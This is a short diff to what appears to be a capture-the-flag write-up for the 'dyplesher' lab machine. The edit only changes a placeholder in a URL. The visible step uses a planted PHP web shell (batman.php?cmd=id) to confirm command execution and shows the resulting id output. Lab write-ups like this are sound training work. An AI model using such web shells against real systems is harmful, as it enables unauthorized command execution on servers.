@@ -119,7 +119,7 @@ http://dyplesher.htb/home/reload
 
 Then, check you can launch a PHP command:
 
-http://[subdomain].dyplesher.htb/batman.php?cmd=id
+http://subdomain.dyplesher.htb/batman.php?cmd=id
 
 uid=1001([user]) gid=1001([user]) groups=1001([user]),122([group])
 
